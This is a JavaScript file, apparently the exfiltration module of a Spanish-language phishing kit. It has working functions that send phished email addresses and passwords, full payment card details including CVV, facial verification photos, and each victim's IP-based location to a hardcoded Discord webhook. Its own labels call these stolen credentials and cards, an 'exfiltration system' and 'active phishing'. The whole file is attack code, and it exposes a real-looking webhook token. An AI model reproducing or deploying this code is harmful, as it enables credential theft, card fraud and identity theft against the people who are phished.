const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462992363814256804/PZcZVPGrikV4XTQEc1DSptMHR8c3ytyx4Q9JcZV7U3NOEFdqQ_XDWOc3yUMqIch1RoLO';
const DISCORD_WEBHOOK_VERIFICATION = 'https://discord.com/api/webhooks/1462992363814256804/PZcZVPGrikV4XTQEc1DSptMHR8c3ytyx4Q9JcZV7U3NOEFdqQ_XDWOc3yUMqIch1RoLO';

async function getLocationInfo() {
    try {
        console.log('📍 Obteniendo ubicación...');
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data && data.ip) {
            console.log('✅ Ubicación obtenida:', data);
            return {
                ip: data.ip || 'No disponible',
                country: data.country_name || 'No disponible',
                region: data.region || 'No disponible',
                city: data.city || 'No disponible'
            };
        } else {
            throw new Error('No se pudo obtener la IP');
        }
    } catch (error) {
        console.error('❌ Error con ipapi.co:', error);
        
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            if (data.ip) {
                console.log('✅ IP obtenida con ipify:', data);
                return {
                    ip: data.ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } else {
                throw new Error('No se pudo obtener la IP con ipify');
            }
        } catch (error) {
            console.error('❌ Error con ipify:', error);
            
            try {
                const response = await fetch('https://api.ipify.org');
                const ip = await response.text();
                return {
                    ip: ip || 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            } catch (error) {
                console.warn('⚠️ No se pudo obtener ubicación:', error);
                return {
                    ip: 'No disponible',
                    country: 'No disponible',
                    region: 'No disponible',
                    city: 'No disponible'
                };
            }
        }
    }
}

async function sendDiscordMessage(embed) {
    try {
        console.log('📤 Enviando mensaje a Discord...');
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        
        if (response.ok) {
            console.log('✅ Mensaje enviado correctamente a Discord');
            return true;
        } else {
            console.error('❌ Error al enviar mensaje:', response.status, response.statusText);
            return false;
        }
    } catch (error) {
        console.error('❌ Error en la conexión con Discord:', error);
        return false;
    }
}

async function sendLoginData(email, password) {
    console.log('🚨 Enviando credenciales...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        const location = await getLocationInfo();
        
        const embed = {
            title: '🔐 NUEVAS CREDENCIALES ROBADAS',
            color: 0xff0000,
            fields: [
                { name: '📧 Correo', value: email, inline: true },
                { name: '🔑 Contraseña', value: password, inline: true },
                { name: '🌍 País', value: location.country, inline: true },
                { name: '📍 Región/Ciudad', value: `${location.city}, ${location.region}`, inline: true },
                { name: '🌐 IP', value: location.ip, inline: true },
                { name: '⏰ Hora', value: timestamp, inline: true }
            ],
            footer: { text: 'Sistema de Exfiltración v2.0' },
            timestamp: new Date().toISOString()
        };
        
        const success = await sendDiscordMessage(embed);
        return success;
    } catch (error) {
        console.error('❌ Error enviando credenciales:', error);
        return false;
    }
}

async function sendCardData(cardInfo) {
    console.log('💳 Enviando datos de tarjeta...');
    
    try {
        const timestamp = new Date().toLocaleString('es-ES');
        const location = await getLocationInfo();
        
        const embed = {
            title: '💳 NUEVA TARJETA ROBADA',
            color: 0x00ff00,
            fields: [
                { name: '👤 Titular', value: cardInfo.cardHolder, inline: false },
                { name: '🔢 Número', value: cardInfo.cardNumber, inline: true },
                { name: '📅 Expiración', value: cardInfo.expiryDate, inline: true },
                { name: '🔐 CVV', value: cardInfo.cvv, inline: true },
                { name: '💰 Límite', value: cardInfo.limit || 'No especificado', inline: true },
                { name: '📧 Email', value: cardInfo.email || 'No especificado', inline: true },
                { name: '🌍 País', value: location.country, inline: true },
                { name: '📍 Región/Ciudad', value: `${location.city}, ${location.region}`, inline: true },
                { name: '🌐 IP', value: location.ip, inline: true },
                { name: '⏰ Hora', value: timestamp, inline: false }
            ],
            footer: { text: 'Datos bancarios capturados' },
            timestamp: new Date().toISOString()
        };
        
        const success = await sendDiscordMessage(embed);
        return success;
    } catch (error) {
        console.error('❌ Error enviando datos de tarjeta:', error);
        return false;
    }
}

async function sendPhotoData(imageData, email) {
    console.log('📸 Enviando foto de verificación...');
    
    try {
        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
        
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        
        formData.append('payload_json', JSON.stringify({
            content: `📸 **Nueva verificación facial**\n📧 **Correo:** ${email || 'No especificado'}`,
            username: 'Verificación Fácil'
        }));
        
        formData.append('file', blob, 'foto-verificacion.jpg');
        
        const response = await fetch(DISCORD_WEBHOOK_VERIFICATION, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            console.log('✅ Foto y correo enviados a Discord');
            return true;
        } else {
            console.error('❌ Error al enviar foto:', response.status);
            return false;
        }
    } catch (error) {
        console.error('❌ Error en sendPhotoData:', error);
        return false;
    }
}

if (typeof window !== 'undefined') {
    window.sendLoginData = sendLoginData;
    window.sendCardData = sendCardData;
    window.sendPhotoData = sendPhotoData;
    
    console.log('✅ Sistema de exfiltración cargado');
    console.log('🎯 Ready para phishing activo');
    console.log('📡 Webhooks configurados correctamente');
}